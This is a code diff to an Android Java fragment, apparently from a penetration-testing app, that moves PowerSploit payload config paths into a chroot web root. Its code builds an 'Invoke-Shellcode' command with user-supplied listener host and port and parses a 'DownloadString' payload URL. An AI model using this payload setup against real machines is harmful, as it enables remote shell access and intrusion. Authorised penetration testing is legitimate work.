@@ -357,8 +357,8 @@ public class HidFragment extends Fragment implements ActionBar.TabListener {
 
     public static class PowerSploitFragment extends Fragment implements OnClickListener {
 
-        private String configFilePath =  "/configs/powersploit-payload";
-        private String configFileUrlPath = "/configs/powersploit-url";
+        private String configFilePath =  "/var/www/html/powersploit-payload";
+        private String configFileUrlPath = "/var/www/html/powersploit-url";
 
         @Override
         public void onActivityCreated(Bundle savedInstanceState) {
@@ -381,7 +381,7 @@ public class HidFragment extends Fragment implements ActionBar.TabListener {
                 case R.id.powersploitOptionsUpdate:
                     try {
 
-                        File myFile = new File(nh.APP_SD_FILES_PATH, configFileUrlPath);
+                        File myFile = new File(nh.CHROOT_PATH, configFileUrlPath);
                         myFile.createNewFile();
                         FileOutputStream fOut = new FileOutputStream(myFile);
                         OutputStreamWriter myOutWriter = new OutputStreamWriter(fOut);
@@ -406,7 +406,7 @@ public class HidFragment extends Fragment implements ActionBar.TabListener {
                     String newString = "Invoke-Shellcode -Payload " + payloadValue + " -Lhost " + ip.getText() + " -Lport " + port.getText() + " -Force";
 
                     ShellExecuter exe = new ShellExecuter();
-                    String source = exe.ReadFile_SYNC(nh.APP_SD_FILES_PATH + configFilePath);
+                    String source = exe.ReadFile_SYNC(nh.CHROOT_PATH + configFilePath);
 
                     String regExPat = "^Invoke-Shellcode -Payload(.*)$";
                     Pattern pattern = Pattern.compile(regExPat, Pattern.MULTILINE);
@@ -414,7 +414,7 @@ public class HidFragment extends Fragment implements ActionBar.TabListener {
                     // NEVER MATCH?
                     if (matcher.find()) {
                         source = source.replace(matcher.group(0), newString);
-                        exe.SaveFileContents(source, nh.APP_SD_FILES_PATH + configFilePath);
+                        exe.SaveFileContents(source, nh.CHROOT_PATH + configFilePath);
                         nh.showMessage("Options updated!");
                     } else {
                         nh.showMessage("Options not updated!");
@@ -433,8 +433,8 @@ public class HidFragment extends Fragment implements ActionBar.TabListener {
 
             new Thread(new Runnable() {
                 public void run() {
-                    final String textUrl = exe.ReadFile_SYNC(nh.APP_SD_FILES_PATH + configFileUrlPath);
-                    final String text = exe.ReadFile_SYNC(nh.APP_SD_FILES_PATH + configFilePath);
+                    final String textUrl = exe.ReadFile_SYNC(nh.CHROOT_PATH + configFileUrlPath);
+                    final String text = exe.ReadFile_SYNC(nh.CHROOT_PATH + configFilePath);
                     String regExPatPayloadUrl = "DownloadString\\(\"(.*)\"\\)";
                     Pattern patternPayloadUrl = Pattern.compile(regExPatPayloadUrl, Pattern.MULTILINE);
                     final Matcher matcherPayloadUrl = patternPayloadUrl.matcher(textUrl);
